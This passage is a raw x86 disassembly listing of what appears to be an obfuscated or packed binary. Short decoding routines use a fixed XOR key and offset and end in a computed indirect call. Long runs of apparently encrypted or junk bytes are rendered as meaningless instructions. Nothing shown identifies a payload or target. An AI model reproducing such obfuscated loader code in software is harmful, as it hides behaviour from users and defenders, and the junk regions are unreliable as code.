  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx+0x752313ed],ch
  4122ef:	push   eax
  4122f0:	push   es
  4122f1:	jle    0x41234f
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x41233c
  4122fa:	rcl    DWORD PTR [ecx+0x6c],cl
  4122fd:	add    eax,0xad1544e2
  412302:	cdq    
  412303:	in     al,0xe9
  412305:	or     ebp,DWORD PTR [eax]
  412307:	xchg   BYTE PTR ds:0x31b69bb5,dh
  41230d:	or     DWORD PTR [edx-0x18062d13],eax
  412313:	in     eax,dx
  412314:	clc    
  412315:	in     al,0xc2
  412317:	push   edx
  412318:	mov    ds:0xac3abec7,al
  41231d:	cmp    bh,BYTE PTR [eax+0x19568579]
  412323:	call   0xdc70:0x7294aa59
  41232a:	adc    eax,0x450457b5
  41232f:	lea    ecx,[ecx+ecx*1]
  412332:	fistp  WORD PTR [ebp-0x6d]
  412335:	shl    DWORD PTR [esi-0x7470eae],cl
  41233b:	imul   ebx,DWORD PTR [edi-0x10f1b308],0x1319b70b
  412345:	mov    esp,0x48dd2f4d
  41234a:	fisttp QWORD PTR [edx+0x2de11b98]
  412350:	inc    esi
  412351:	call   0x8edd127f
  412356:	pop    edi
  412357:	push   edi
  412358:	mov    BYTE PTR [esi+eiz*1-0x9],bh
  41235c:	popa   
  41235d:	dec    ebx
  41235e:	dec    eax
  41235f:	out    0xa1,eax
  412361:	xchg   edi,eax
  412362:	test   BYTE PTR [eax+eax*8],dh
  412365:	sbb    edi,DWORD PTR [edi+0x6f]
  412368:	mov    ds,WORD PTR [edx+0x500be49]
  41236e:	fs push ds
  412370:	pop    eax
  412371:	xor    al,0xa4
  412373:	data16 std 
  412375:	pop    es
  412376:	xchg   BYTE PTR [ebp+0x12],dh
  412379:	das    
  41237a:	jo     0x41231f
  41237c:	les    ecx,FWORD PTR [edi]
  41237e:	ins    BYTE PTR es:[edi],dx
  41237f:	pop    esi
  412380:	mov    ecx,0x7356216a
  412385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412386:	stc    
  412387:	or     DWORD PTR [ebx+0x7057320a],0xfffffff8
  41238e:	jge    0x412354
  412390:	fs ss inc esp
  412393:	lods   eax,DWORD PTR ds:[esi]
  412394:	mov    ds:0x69dffff1,eax
  412399:	scas   eax,DWORD PTR es:[edi]
  41239a:	icebp  
  41239b:	and    DWORD PTR [edi+0x7c60b12c],0x60fcbab6
  4123a5:	div    DWORD PTR [ebx-0x7a]
  4123a8:	js     0x4123bf
  4123aa:	dec    edi
  4123ab:	(bad)  [eax-0x74]
  4123ae:	pop    edi
  4123af:	jbe    0x412398
  4123b1:	sbb    cl,dh
  4123b3:	pusha  
  4123b4:	std    
  4123b5:	in     eax,dx
  4123b6:	and    dh,BYTE PTR [edi-0x1]
  4123b9:	adc    al,0x14
  4123bb:	lock cwde 
  4123bd:	mov    ds:0x32abe01e,al
  4123c2:	mov    edi,0xc49ff090
  4123c7:	adc    edx,DWORD PTR [ebp-0x23]
  4123ca:	daa    
  4123cb:	iret   
  4123cc:	xchg   DWORD PTR [esi+0x7bc3e821],esi
  4123d2:	jmp    0x150b:0x2ce8ec4
  4123d9:	sbb    bl,BYTE PTR [edi]
  4123db:	add    al,0x58
  4123dd:	xchg   esi,eax
  4123de:	jle    0x4123f1
  4123e0:	pop    ecx
  4123e1:	in     eax,0xc7
  4123e3:	mov    eax,es:0x39f0135a
  4123e9:	(bad)  
  4123eb:	outs   dx,DWORD PTR ds:[esi]
  4123ec:	jmp    0x4123a2
  4123ee:	mov    eax,ds:0xc3d2ad0f
  4123f3:	mov    ds:0xda058d00,eax
  4123f8:	xor    DWORD PTR [ebp+0x5d],esi
  4123fb:	pop    ds
  4123fc:	jge    0x4123eb
  4123fe:	add    BYTE PTR [ebp-0x5a251334],ch
  412404:	sub    bh,BYTE PTR [ecx]
  412406:	rol    DWORD PTR [esi-0x74],1
  412409:	out    dx,al
  41240a:	rol    DWORD PTR [edx+edi*2-0x35],cl
  41240e:	aam    0x21
  412410:	jp     0x412468
  412412:	sub    al,0x29
  412414:	pop    ebp
  412415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412416:	or     BYTE PTR [esi],0x30
  412419:	nop
  41241a:	xor    eax,0xa6767cca
  41241f:	cmp    cl,BYTE PTR [ebx]
  412421:	jne    0x41241e
  412423:	mov    ebx,esp
  412425:	into   
  412426:	or     eax,0xb0dcabd9
  41242b:	int3   
  41242c:	or     al,0xae
  41242e:	call   0x403a:0x3cb7a189
  412435:	pop    ebx
  412436:	imul   edx,edx,0x41967b1
  41243c:	mov    edi,0x21279a53
  412441:	cld    
  412442:	xchg   esi,eax
  412443:	ret    0x7d55
  412446:	pop    edx
  412447:	xchg   DWORD PTR [ebx],edi
  412449:	adc    bl,BYTE PTR [eax]
  41244b:	fist   WORD PTR [esi-0x33ae5dd5]
  412451:	xchg   ecx,eax
  412452:	nop
  412453:	xlat   BYTE PTR ds:[ebx]
  412454:	in     al,0xc3
  412456:	in     eax,dx
  412457:	ret    
  412458:	xor    DWORD PTR [eax-0x3b],esp
  41245b:	xor    dl,BYTE PTR [eax+0x52bec1bb]
  412461:	(bad)  
  412463:	or     bh,BYTE PTR [esi]
  412465:	pop    ebp
  412466:	sub    al,cl
  412468:	jae    0x412435
  41246a:	xor    BYTE PTR [edi],dl
  41246c:	xchg   ebx,eax
  41246d:	push   ebx
  41246e:	mov    bh,0x4d
  412470:	test   DWORD PTR [ebp-0x12],0xe1d1935f
  412477:	add    eax,0xe66c3fb5
  41247c:	loopne 0x41242f
  41247e:	cmp    cl,BYTE PTR [esi]
  412480:	pushf  
  412481:	pusha  
  412482:	xor    edi,DWORD PTR [ebp+0x67d5155d]
  412488:	ins    DWORD PTR es:[edi],dx
  412489:	push   ss
  41248a:	in     eax,0xa5
  41248c:	mov    edi,0xb27a1eb
  412491:	and    cl,bh
  412493:	xor    esi,DWORD PTR [esi+0x44a028b3]
  412499:	adc    al,0x76
  41249b:	or     al,0x69
  41249d:	aad    0x56
  41249f:	jge    0x412435
  4124a1:	xor    al,BYTE PTR [ecx+0x4514ced5]
  4124a7:	xchg   ebp,eax
  4124a8:	aaa    
  4124a9:	xor    esp,eax
  4124ab:	sub    edi,DWORD PTR [edi+0x69]
  4124ae:	jns    0x4124e4
  4124b0:	adc    DWORD PTR [ebx+0x10],0x2397064d
  4124b7:	xlat   BYTE PTR ds:[ebx]
  4124b8:	pop    ebp
  4124b9:	jns    0x4124a7
  4124bb:	xor    al,0xbe
  4124be:	inc    ecx
  4124bf:	and    BYTE PTR [ebx+0x13],cl
  4124c2:	xor    BYTE PTR [eax],dl
  4124c4:	and    eax,0x4b50b122
  4124c9:	and    esi,DWORD PTR [eax+0x4de9de10]
  4124cf:	imul   ebp,DWORD PTR [esi],0xf8671cb6
  4124d5:	repnz and bh,BYTE PTR [esi]
  4124d8:	and    DWORD PTR [ebx+0x50],eax
  4124db:	pusha  
  4124dc:	add    eax,DWORD PTR [ebp+0x8]
  4124df:	mov    DWORD PTR [ebp-0x10],eax
  4124e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4124e5:	test   eax,eax
  4124e7:	je     0x4129b7
  4124ed:	mov    DWORD PTR [ebp-0x24],esi
  4124f0:	push   0xb
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	call   0x7e5d:0x593db320
  4125a5:	jle    0x412600
  4125a7:	jg     0x412627
  4125a9:	jle    0x4125dd
  4125ab:	addr16 lock test esp,edx
  4125af:	inc    edi
  4125b0:	lea    esp,[eax-0xdac0fd8]
  4125b6:	fld    TBYTE PTR [eax+0x229367b6]
  4125bc:	daa    
  4125bd:	push   ebx
  4125be:	mov    cl,0x7d
  4125c0:	push   0xf73faf85
  4125c5:	sbb    BYTE PTR [ebp+eax*4+0x5],bh
  4125c9:	push   0x2850419d
  4125ce:	inc    ebx
  4125cf:	idiv   DWORD PTR [edi+0x1c78842d]
  4125d5:	sub    edi,esi
  4125d7:	inc    esp
  4125d8:	dec    edi
  4125d9:	inc    bx
  4125db:	cmc    
  4125dc:	pushf  
  4125dd:	xchg   DWORD PTR [ecx+0x22cf237c],eax
  4125e3:	sbb    bh,BYTE PTR [ecx-0xb2e4f0f]
  4125e9:	add    DWORD PTR [edi],ebx
  4125eb:	ins    BYTE PTR es:[edi],dx
  4125ec:	aad    0x9a
  4125ee:	and    ebx,DWORD PTR [esi-0x4f4cde23]
  4125f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f5:	iret   
  4125f6:	mov    ch,0x8c
  4125f8:	xchg   esi,eax
  4125f9:	xor    esp,DWORD PTR [ecx-0x437956de]
  4125ff:	test   BYTE PTR [ecx-0x257bdebd],ah
  412605:	sbb    DWORD PTR ds:0xd6751b19,edx
  41260b:	add    al,0x6e
  41260d:	jge    0x412670
  41260f:	sub    bh,BYTE PTR [ecx-0x34]
  412612:	dec    ecx
  412613:	push   ss
  412614:	ret    
  412615:	mov    dl,0x4
  412617:	stos   BYTE PTR es:[edi],al
  412618:	dec    edi
  412619:	cs adc al,0x15
  41261c:	iret   
  41261d:	(bad)  
  41261e:	in     eax,dx
  41261f:	push   es
  412620:	arpl   WORD PTR [ecx],si
  412622:	adc    esi,DWORD PTR [edx-0x68842778]
  412628:	les    edi,FWORD PTR [eax+0x3de91b11]
  41262e:	repz and DWORD PTR [ebx+0x75638eb6],ecx
  412635:	pop    ebx
  412636:	out    dx,al
  412637:	jp     0x41260b
  412639:	xchg   ebp,eax
  41263a:	cld    
  41263b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41263c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41263d:	int    0x9b
  41263f:	call   0xc014:0x332de735
  412646:	int3   
  412647:	aad    0xc4
  412649:	je     0x412661
  41264b:	cmp    DWORD PTR [edx+0x3d464489],esi
  412651:	adc    esp,DWORD PTR [esi+ebx*2-0x64]
  412655:	add    al,0x2
  412657:	jle    0x41263c
  412659:	test   BYTE PTR [eax+ebp*2],ch
  41265c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41265d:	jno    0x4125fb
  41265f:	rol    DWORD PTR [esi+eax*4+0x7b6fedd],1
  412666:	mov    esi,DWORD PTR [edx+0x5e]
  412669:	sub    edi,esp
  41266b:	sbb    BYTE PTR [ebx+0x63],0xa8
  41266f:	push   edi
  412670:	mov    ah,0xc5
  412672:	inc    edi
  412673:	aaa    
  412674:	out    dx,eax
  412675:	mov    ah,0xaf
  412677:	jno    0x41263d
  412679:	cmp    al,0x53
  41267b:	aas    
  41267c:	adc    eax,0x783ca114
  412681:	push   eax
  412682:	out    dx,al
  412683:	rcl    dh,1
  412685:	or     eax,0xc7da8ddb
  41268a:	fwait
  41268b:	mov    ch,0x98
  41268d:	loop   0x41264b
  41268f:	push   edx
  412690:	ins    BYTE PTR es:[edi],dx
  412691:	sti    
  412692:	pop    edx
  412693:	add    al,0x11
  412695:	jg     0x41269f
  412697:	cmp    cl,bh
  412699:	inc    eax
  41269a:	xor    esp,DWORD PTR [edx-0x4eb0fda8]
  4126a0:	dec    edx
  4126a1:	push   0x49
  4126a3:	out    0xe9,eax
  4126a5:	cdq    
  4126a6:	push   ebp
  4126a7:	pop    esp
  4126a8:	lea    ebx,[eax-0x1e]
  4126ab:	test   al,0x99
  4126ad:	ja     0x412637
  4126af:	and    esp,edi
  4126b1:	aas    
  4126b2:	out    0xce,al
  4126b4:	jne    0x4126bc
  4126b6:	sar    DWORD PTR [edi+esi*1+0x78],1
  4126ba:	adc    ebx,ebx
  4126bc:	pop    es
  4126bd:	sbb    eax,0xde2bd95
  4126c2:	sbb    ecx,ecx
  4126c4:	xchg   cx,ax
  4126c6:	ja     0x412693
  4126c8:	sub    cl,BYTE PTR [esi-0x56]
  4126cb:	ror    BYTE PTR [esi-0x6fb0abcd],cl
  4126d1:	add    BYTE PTR [edi-0x615ba232],ah
  4126d7:	dec    ebx
  4126d8:	lods   eax,DWORD PTR ds:[esi]
  4126d9:	test   al,0x1c
  4126db:	repnz std 
  4126dd:	shl    DWORD PTR [ebx+0x7b],0x9c
  4126e1:	xchg   ebp,eax
  4126e2:	lds    eax,FWORD PTR ds:[edi-0x3a]
  4126e6:	(bad)  
  4126e7:	mov    edx,0xaf077441
  4126ec:	jle    0x41269e
  4126ee:	pop    ebp
  4126ef:	pop    esp
  4126f0:	ret    0xbd54
  4126f3:	mov    dl,0xfe
  4126f5:	mov    esi,0xf4c23c4c
  4126fa:	data16 or BYTE PTR [eax+0x1eb450e1],ah
  412701:	(bad)  
  412703:	js     0x41271b
  412705:	xchg   ebx,eax
  412706:	push   ss
  412707:	in     al,dx
  412708:	xchg   ecx,eax
  41270a:	jns    0x41277c
  41270c:	inc    eax
  41270d:	rcr    ecx,cl
  41270f:	cs fs cld 
  412712:	xlat   BYTE PTR ds:[ebx]
  412713:	pop    ebp
  412714:	push   es
  412715:	in     eax,dx
  412716:	cmp    DWORD PTR [esi+0x2d36f166],eax
  41271c:	inc    edi
  41271d:	mov    ebp,0x6d2c4485
  412722:	shr    DWORD PTR [ebp-0x3c],cl
  412725:	dec    esi
  412727:	mov    dl,0x3
  412729:	gs jge 0x4126da
  41272c:	cmp    ah,BYTE PTR [eax+0x4c]
  41272f:	fisttp WORD PTR [edx]
  412731:	inc    esp
  412732:	sub    dl,BYTE PTR [ecx]
  412734:	add    BYTE PTR [ebx+0x4aea3f93],bh
  41273a:	js     0x4126cf
  41273c:	imul   ebp,DWORD PTR [edi],0xf6aef9fd
  412742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412743:	sub    cl,BYTE PTR [edx+0x53eb75c0]
  412749:	mov    ch,BYTE PTR [edx+0x268c6e31]
  41274f:	and    DWORD PTR [eax+0x5e],edi
  412752:	in     al,0xbe
  412754:	cmc    
  412755:	in     eax,0xb0
  412757:	fist   DWORD PTR [edx-0x1463c174]
  41275d:	push   esi
  41275e:	test   BYTE PTR [ecx-0x33fcb26d],bh
  412764:	in     eax,dx
  412765:	mov    ds:0x3901508f,eax
  41276a:	loopne 0x4127d1
  41276c:	inc    ecx
  41276d:	jge    0x412714
  41276f:	sahf   
  412770:	sub    eax,0x452a21fa
  412775:	cwde   
  412776:	gs pop ebx
  412778:	mov    eax,0x85d515c
  41277d:	neg    BYTE PTR [ecx+0x584579d2]
  412783:	add    al,0x49
  412785:	(bad)  [esi]
  412787:	stos   BYTE PTR es:[edi],al
  412788:	pushf  
  412789:	add    BYTE PTR [eax-0x34],bl
  41278c:	fidiv  WORD PTR [ebx]
  41278e:	shr    ecx,0xfb
  412791:	add    DWORD PTR [eax],eax
  412793:	add    BYTE PTR [edi],dh
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	fs jmp 0x41272f
  4127a3:	loope  0x4127e9
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x41274e
  4127ad:	aaa    
  4127ae:	mov    ecx,0xdf97fd8e
  4127b3:	hlt    
  4127b4:	cmp    DWORD PTR [edi+edx*1+0x51fa1496],edi
  4127bb:	xor    esp,ebp
  4127bd:	or     al,BYTE PTR [edi-0x6c]
  4127c0:	rcr    BYTE PTR [edi+0x79],0x35
  4127c4:	int    0xec
  4127c6:	shl    DWORD PTR [ebx+0x41cea5d4],cl
  4127cc:	cmc    
  4127cd:	xor    dl,BYTE PTR [ecx+0x6e]
  4127d0:	xchg   esi,eax
  4127d1:	xor    eax,0xa659f4e
  4127d6:	push   ss
  4127d7:	fdivr  QWORD PTR [esi+0x4991cd05]
  4127dd:	push   edi
  4127de:	aam    0xaf
  4127e0:	in     al,dx
  4127e1:	retf   
  4127e2:	test   bl,al
  4127e4:	jp     0x41281d
  4127e6:	jmp    0x97b6ab5f
  4127eb:	sti    
  4127ec:	int    0x1d
  4127ee:	cs pop ds
  4127f0:	xchg   BYTE PTR [esi],bh
  4127f2:	pusha  
  4127f3:	or     al,0x47
  4127f5:	dec    eax
  4127f6:	mov    ah,BYTE PTR [ebx-0x198600f3]
  4127fc:	mov    ebx,0x1793751c
  412801:	pop    edi
  412802:	jle    0x4127a7
  412804:	mov    DWORD PTR [ebx-0x18a4a3cb],esp
  41280a:	jae    0x412876
  41280c:	sub    BYTE PTR [ecx],dl
  41280e:	data16 fdiv QWORD PTR [ecx-0x4]
  412812:	inc    ecx
  412813:	sub    ebp,0xffffffef
  412816:	mov    edi,0x944bf187
  41281b:	and    ecx,edi
  41281d:	mov    eax,ds:0xd8035a76
  412822:	adc    eax,0x272274f5
  412827:	dec    ecx
  412828:	or     eax,0x261f5fe1
  41282d:	inc    ecx
  41282e:	cmp    esp,0x479c97c1
  412834:	inc    esp
  412835:	mov    fs,WORD PTR [edi]
  412837:	mov    eax,ds
  412839:	jbe    0x412898
  41283b:	add    dh,BYTE PTR [eax+0x5fddf463]
  412841:	sbb    eax,0x638b13f9
  412846:	out    dx,al
  412847:	adc    DWORD PTR [edx+0x7c4e9254],0xe7718fbd
  412851:	push   esi
  412852:	mov    dh,dh
  412854:	jae    0x4127db
  412856:	push   ebp
  412857:	add    al,0x19
  412859:	fs dec ecx
  41285b:	dec    edx
  41285c:	add    al,0x25
  41285e:	sbb    al,0x8
  412860:	fist   DWORD PTR [ebx-0x44ca9358]
  412866:	jle    0x412887
  412868:	jge    0x412843
  41286a:	aaa    
  41286b:	sub    al,0x5e
  41286d:	aaa    
  41286e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41286f:	lea    ecx,[eax-0x12]
  412872:	(bad)  
  412874:	pop    ss
  412875:	sti    
  412876:	aam    0x23
  412878:	push   esp
  412879:	call   0xf0c8:0xff27f58b
  412880:	jg     0x4128e9
  412882:	call   0xc4c681df
  412887:	nop
  412888:	jl     0x4128e6
  41288a:	mov    edi,0x4a9db7b2
  41288f:	mov    al,0x62
  412891:	ja     0x4128f4
  412893:	inc    eax
  412894:	xchg   esi,eax
  412895:	jno    0x4128fb
  412897:	idiv   DWORD PTR [edi-0x74]
  41289a:	cs (bad) 
  41289c:	outs   dx,BYTE PTR ds:[esi]
  41289d:	call   0x82ca393f
  4128a2:	jne    0x412825
  4128a4:	xchg   ecx,eax
  4128a5:	je     0x41285a
  4128a7:	inc    edx
  4128a8:	in     eax,dx
  4128a9:	jle    0x4128b4
  4128ab:	xchg   BYTE PTR [ebp-0x20],bh
  4128ae:	out    dx,eax
  4128af:	clc    
  4128b0:	add    DWORD PTR [eax-0x11a3f0cf],0x8aa5638c
  4128ba:	jno    0x4128ed
  4128bc:	sub    edi,ebx
  4128be:	mov    cl,0x53
  4128c0:	jno    0x412930
  4128c2:	cmp    BYTE PTR [ebx],al
  4128c4:	inc    ecx
  4128c5:	xor    ebp,ecx
  4128c7:	push   0x7db937be
  4128cc:	sub    eax,0xa228f94a
  4128d1:	cmp    eax,0xfc61c47b
  4128d6:	pop    esi
  4128d7:	lds    esp,FWORD PTR [esi]
  4128d9:	aad    0x2b
  4128db:	pop    edi
  4128dc:	fwait
  4128dd:	pusha  
  4128de:	mov    bh,0x65
  4128e0:	or     eax,ebx
  4128e2:	mov    edi,0x7774d155
  4128e7:	in     al,dx
  4128e8:	xchg   ebp,eax
  4128e9:	mov    DWORD PTR [ebx-0x6b9dab57],esi
  4128ef:	push   ebx
  4128f0:	dec    ebp
  4128f1:	xchg   ebx,eax
  4128f2:	pop    esp
  4128f3:	cli    
  4128f4:	fist   DWORD PTR [ecx+0x28]
  4128f7:	inc    esp
  4128f8:	mov    WORD PTR [ecx-0x46],?
  4128fb:	add    BYTE PTR [edi-0x1cba43a6],0x66
  412902:	mov    edi,0xfcfa4494
  412907:	(bad)  
  412908:	or     ebp,DWORD PTR [eax+0x5c22a5e6]
  41290e:	lods   al,BYTE PTR ds:[esi]
  41290f:	pop    esp
  412910:	std    
  412911:	mov    ebp,ds
  412913:	jb     0x412930
  412915:	inc    ebp
  412916:	pushf  
  412917:	cwde   
  412918:	adc    eax,0xda18a6
  41291d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41291e:	fsub   DWORD PTR ds:0x425fb5f6
  412924:	mov    ds:0x65b46e0a,al
  412929:	in     al,0x94
  41292b:	loop   0x4128f7
  41292d:	mov    bh,0xa3
  41292f:	repnz cdq 
  412931:	leave  
  412932:	push   0x295c968b
  412937:	mov    ch,0x91
  412939:	out    dx,eax
  41293a:	dec    ebp
  41293b:	mov    ebx,0x6c4fd674
  412940:	lea    ecx,[bp+0x3f00]
  412945:	cs adc al,0x35
  412948:	adc    BYTE PTR [ebp+eax*2-0x5b],bh
  41294c:	add    ebp,DWORD PTR [ebp+0x76]
  41294f:	xchg   DWORD PTR [edx+0x1bee7f7e],ebx
  412955:	arpl   WORD PTR ds:0xe8b335b9,bp
  41295b:	aas    
  41295c:	add    eax,0x6ac34cc0
  412961:	adc    edx,DWORD PTR [ebp-0x4ead459e]
  412967:	popf   
  412968:	or     al,0x25
  41296a:	push   esp
  41296b:	push   ds
  41296c:	cwde   
  41296d:	push   ss
  41296e:	(bad)
  412971:	das    
  412972:	or     al,0xf
  412974:	push   ebp
  412975:	jg     0x4128f8
  412977:	test   BYTE PTR [edi],bh
  412979:	cmp    al,0xb2
  41297b:	or     ah,BYTE PTR [ecx]
  41297d:	(bad)  
  41297e:	adc    eax,0x127765f4
  412983:	mov    cs,WORD PTR [ecx-0x4340447e]
  412989:	push   ebp
  41298a:	aaa    
  41298b:	jno    0x41296a
  41298d:	mov    cl,0x20
  41298f:	add    eax,esi
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fsubr  st,st(1)
  4129ef:	lods   al,BYTE PTR ds:[esi]
  4129f0:	and    eax,0x7e59a765
  4129f5:	jle    0x412a50
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a1e
  4129fb:	mov    al,ds:0xacc48188
  412a00:	or     BYTE PTR [ecx+ebx*1],0x20
  412a04:	mov    esi,0xd9858bd4
  412a09:	pop    esi
  412a0a:	out    0xb8,eax
  412a0c:	or     ebp,DWORD PTR [ebp+0x2f8cb061]
  412a12:	pop    ecx
  412a13:	inc    eax
  412a14:	loopne 0x4129fd
  412a16:	in     eax,dx
  412a17:	mov    dl,0x83
  412a19:	or     edi,DWORD PTR [edi+0x19]
  412a1c:	adc    BYTE PTR [edi+0xa],ch
  412a1f:	pop    ss
  412a20:	in     eax,dx
  412a21:	test   DWORD PTR [ebx-0x76],esp
  412a24:	test   DWORD PTR ds:0xcd251bb5,ebp
  412a2a:	push   cs
  412a2b:	inc    DWORD PTR [ebx+0x49]
  412a2e:	push   edi
  412a2f:	ds fwait
  412a31:	popf   
  412a32:	pushf  
  412a33:	arpl   WORD PTR [edi+0x6b6fec52],ax
  412a39:	daa    
  412a3a:	sub    ch,BYTE PTR [ecx]
  412a3c:	fsub   DWORD PTR [edi-0x4d]
  412a3f:	popa   
  412a40:	outs   dx,DWORD PTR ds:[esi]
  412a41:	dec    eax
  412a42:	dec    ebx
  412a43:	outs   dx,DWORD PTR ds:[esi]
  412a44:	int3   
  412a45:	xchg   esp,ebp
  412a47:	mov    esp,DWORD PTR [ebx]
  412a49:	jecxz  0x412ab2
  412a4b:	push   ds
  412a4c:	mov    ah,0x35
  412a4e:	xor    bh,BYTE PTR [edi-0x1de0270c]
  412a54:	and    cl,BYTE PTR [eax+0x7b]
  412a57:	icebp  
  412a58:	test   DWORD PTR [edx+0x44],0x84b85dd0
  412a5f:	scas   eax,DWORD PTR es:[edi]
  412a60:	pop    ecx
  412a61:	pop    edx
  412a62:	rol    BYTE PTR [edx+0x23182ba2],1
  412a68:	push   ecx
  412a69:	mov    al,0x6c
  412a6b:	xor    ebx,esi
  412a6d:	in     al,0x5c
  412a6f:	lock mov ecx,0xef4e4f91
  412a75:	and    al,0xef
  412a77:	mov    ds:0xa0df7f7b,eax
  412a7c:	adc    eax,0xf9509e9
  412a81:	adc    eax,0x9cccd0b7
  412a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a87:	aam    0x82
  412a89:	lahf   
  412a8a:	arpl   WORD PTR ds:0x805b3aea,sp
  412a90:	ins    DWORD PTR es:[edi],dx
  412a91:	add    ebx,edx
  412a93:	jp     0x412a68
  412a95:	sub    eax,0xf50f5875
  412a9a:	popf   
  412a9b:	pop    ebx
  412a9c:	mov    esp,0xd48aac04
  412aa1:	fst    QWORD PTR [edx]
  412aa3:	int3   
  412aa4:	into   
  412aa5:	jns    0x412a40
  412aa7:	outs   dx,BYTE PTR ds:[esi]
  412aa8:	mov    al,0x33
  412aaa:	je     0x412aa3
  412aac:	scas   eax,DWORD PTR es:[edi]
  412aad:	retf   
  412aae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aaf:	sub    DWORD PTR [ecx-0x4fe9146a],eax
  412ab5:	mov    ebp,eax
  412ab7:	les    edx,FWORD PTR [edi]
  412ab9:	nop
  412aba:	imul   edi,edx,0x1c8a7f11
  412ac0:	sub    ecx,DWORD PTR [edi+esi*8]
  412ac3:	add    BYTE PTR [esi-0x20],cl
  412ac6:	jge    0x412a8e
  412ac8:	(bad)  
  412ac9:	fwait
  412aca:	std    
  412acb:	addr16 popf 
  412acd:	inc    edx
  412ace:	and    BYTE PTR [eax],al
  412ad0:	stos   BYTE PTR es:[edi],al
  412ad1:	iret   
  412ad2:	or     ebp,ebx
  412ad4:	dec    ecx
  412ad5:	fcom   DWORD PTR [ebx+0x6bb1d526]
  412adb:	test   eax,0x2a625dff
